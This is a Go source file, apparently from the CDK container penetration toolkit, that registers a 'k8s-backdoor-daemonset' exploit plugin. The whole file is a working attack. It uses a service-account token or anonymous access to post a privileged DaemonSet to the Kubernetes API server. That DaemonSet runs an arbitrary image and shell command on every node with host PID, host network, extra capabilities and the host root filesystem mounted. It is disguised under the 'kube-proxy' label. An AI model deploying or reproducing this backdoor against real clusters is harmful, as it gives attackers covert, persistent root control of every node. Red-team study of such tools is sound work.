// +build !no_k8s_backdoor_daemonset

package exploit

import (
	"fmt"
	"github.com/cdk-team/CDK/conf"
	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/tool/kubectl"
	"github.com/hashicorp/go-version"
	"log"
	"strings"
)

var k8sDaemonsetApi = "/apis/${API_VERSION}/namespaces/kube-system/daemonsets"
var k8sBackdoorDaemonsetJson = `
{
	"apiVersion": "${API_VERSION}",
	"kind": "DaemonSet",
	"metadata": {
		"annotations": {},
		"labels": {
			"k8s-app": "${K8S_APP}"
		},
		"name": "cdk-backdoor-daemonset"
	},
	"spec": {
		"selector": {
			"matchLabels": {
				"k8s-app": "${K8S_APP}"
			}
		},
		"template": {
			"metadata": {
				"labels": {
					"k8s-app": "${K8S_APP}"
				}
			},
			"spec": {
				"containers": [{
					"args": ["/bin/sh", "-c", "${SHELL_CMD}"],
					"image": "${IMAGE}",
					"imagePullPolicy": "IfNotPresent",
					"name": "cdk-backdoor-pod",
					"securityContext": {
						"capabilities": {
							"add": ["NET_ADMIN", "SYS_ADMIN", "SYS_PTRACE", "AUDIT_CONTROL", "MKNOD", "SETFCAP"]
						},
						"privileged": true
					},
					"volumeMounts": [{
						"mountPath": "/host-root",
						"name": "host-volume"
					}]
				}],
				"hostNetwork": true,
				"hostPID": true,
				"restartPolicy": "Always",
				"volumes": [{
					"hostPath": {
						"path": "/"
					},
					"name": "host-volume"
				}]
			}
		}
	}
}
`

func getBackDoorDaemonsetJson(k8sApp string, image string, shellCmd string, apiVersion string) string {
	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${K8S_APP}", k8sApp, -1)
	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${IMAGE}", image, -1)
	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${SHELL_CMD}", shellCmd, -1)
	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${API_VERSION}", apiVersion, -1)
	return k8sBackdoorDaemonsetJson
}

func getDaemonsetApi(apiVersion string) string {
	k8sDaemonsetApi = strings.Replace(k8sDaemonsetApi, "${API_VERSION}", apiVersion, -1)
	return k8sDaemonsetApi
}

func getApiVersion(serverAddr string) (string, error) {
	serverVersion, err := kubectl.GetServerVersion(serverAddr)
	if err != nil {
		return "", fmt.Errorf("failed to get server version: %v", err)
	}
	v, _ := version.NewVersion(serverVersion)
	var apiVersion string
	// from v1.16 on, use apps/v1 instead of extensions/v1beta1
	constraints, _ := version.NewConstraint(">=v1.16")
	if constraints.Check(v) {
		apiVersion = "apps/v1"
	} else {
		apiVersion = "extensions/v1beta1"
	}
	return apiVersion, nil
}

func DeployBackdoorDaemonset(serverAddr string, tokenPath string, image string, inputArgs string, k8sApp string) bool {
	apiVersion, err := getApiVersion(serverAddr)
	if err != nil {
		fmt.Println(err)
		return false
	}
	opts := kubectl.K8sRequestOption{
		TokenPath: "",
		Server:    serverAddr,
		Api:       getDaemonsetApi(apiVersion),
		Method:    "POST",
		PostData:  "",
		Anonymous: false,
	}

	switch tokenPath {
	case "default":
		opts.TokenPath = conf.K8sSATokenDefaultPath
	case "anonymous":
		opts.TokenPath = ""
		opts.Anonymous = true
	default:
		opts.TokenPath = tokenPath
	}

	log.Printf("trying to deploy daemonset with image:%s to k8s-app:%s", image, k8sApp)
	opts.PostData = getBackDoorDaemonsetJson(k8sApp, image, inputArgs, apiVersion)
	resp, err := kubectl.ServerAccountRequest(opts)
	if err != nil {
		fmt.Println(err)
		return false
	}
	log.Println("api-server response:")
	fmt.Println(resp)
	return true
}

// plugin interface
type K8sBackDoorDaemonsetS struct{}

func (p K8sBackDoorDaemonsetS) Desc() string {
	return "deploy image to every node using daemonset, usage: cdk run k8s-backdoor-daemonset (default|anonymous|<service-account-token-path>) <image> <cmd>"
}
func (p K8sBackDoorDaemonsetS) Run() bool {
	args := cli.Args["<args>"].([]string)
	if len(args) != 3 {
		log.Println("invalid input args.")
		log.Fatal(p.Desc())
	}

	// get api-server connection conf in ENV
	log.Println("getting K8s api-server API addr.")
	addr, err := kubectl.ApiServerAddr()
	if err != nil {
		fmt.Println(err)
		return false
	}
	fmt.Println("\tFind K8s api-server in ENV:", addr)

	tokenPath := args[0]
	image := args[1]
	inputArgs := args[2]

	return DeployBackdoorDaemonset(addr, tokenPath, image, inputArgs, "kube-proxy") // use kube-proxy-worker in alibaba cloud
}

func init() {
	exploit := K8sBackDoorDaemonsetS{}
	plugin.RegisterExploit("k8s-backdoor-daemonset", exploit)
}
